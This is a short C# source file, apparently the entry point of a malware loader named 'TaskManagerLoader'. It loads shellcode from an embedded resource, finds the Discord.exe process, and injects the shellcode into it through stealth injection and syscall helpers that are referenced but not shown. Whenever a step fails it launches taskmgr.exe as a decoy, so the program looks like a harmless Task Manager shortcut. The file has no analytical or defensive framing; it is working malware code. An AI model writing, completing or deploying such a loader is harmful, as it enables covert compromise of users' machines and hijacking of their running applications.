using System;
using System.Diagnostics;

namespace TaskManagerLoader
{
    class Program
    {
        static void Main()
        {
            try
            {
                if (!NtSyscalls.Initialize())
                {
                    Process.Start("taskmgr.exe");
                    return;
                }

                byte[] shellcode = StealthUtils.LoadShellcodeFromResource();

                if (shellcode == null || shellcode.Length == 0)
                {
                    Process.Start("taskmgr.exe");
                    return;
                }

                int targetPid = StealthInjection.FindProcessStealth("Discord.exe");
                
                if (targetPid == 0)
                {
                    Process.Start("taskmgr.exe");
                    return;
                }

                StealthInjection.InjectShellcode(targetPid, shellcode);
            }
            catch
            {
                try
                {
                    Process.Start("taskmgr.exe");
                }
                catch { }
            }
        }
    }
}
